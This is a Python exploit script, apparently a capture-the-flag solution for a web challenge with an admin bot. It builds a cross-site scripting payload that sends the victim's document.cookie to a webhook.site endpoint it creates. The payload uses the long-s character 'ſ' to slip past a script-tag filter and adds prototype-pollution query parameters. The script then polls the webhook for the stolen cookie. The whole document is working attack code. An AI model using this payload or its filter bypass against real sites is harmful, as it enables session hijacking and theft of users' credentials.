import requests
import urllib.parse
import time
import sys

def solve():
    print("[*] Creating webhook...")
    try:
        resp = requests.post("https://webhook.site/token")
        resp.raise_for_status()
        token = resp.json()["uuid"]
        webhook_url = f"https://webhook.site/{token}"
        print(f"[+] Webhook URL: {webhook_url}")
    except Exception as e:
        print("[-] Failed to create webhook:", e)
        # fallback to a public endpoint if needed, but webhook.site should work
        sys.exit(1)
        
    js_payload = f"fetch('{webhook_url}?c=' + btoa(document.cookie))"
    # using ſcript for tag bypass
    draft_html = f"<ſcript>{js_payload}</ſcript>"
    
    params = {
        "p": "__proto__.engine=go",
        "tpl": "{{__proto__.engine}}",
        "d": draft_html
    }
    
    query = urllib.parse.urlencode(params)
    # The 'ſ' must be properly urlencoded as %C5%BF
    exploit_url = f"https://demolition.breakable.live/?{query}"
    
    print("[+] Exploit URL crafted:")
    print(exploit_url)
    print("\n[*] Now submit this URL to the bot: https://demolition-bot.breakable.live/")
    print("[*] Polling webhook for 60 seconds...")
    
    for i in range(30):
        time.sleep(2)
        try:
            reqs = requests.get(f"https://webhook.site/token/{token}/requests")
            data = reqs.json()
            if data["data"]:
                print("[+] Request received!")
                for r in data["data"]:
                    print("Query:", r["query"])
                    print("Headers:", r["headers"])
                    print("Body:", r["content"])
                return
        except Exception as e:
            pass
            
solve()
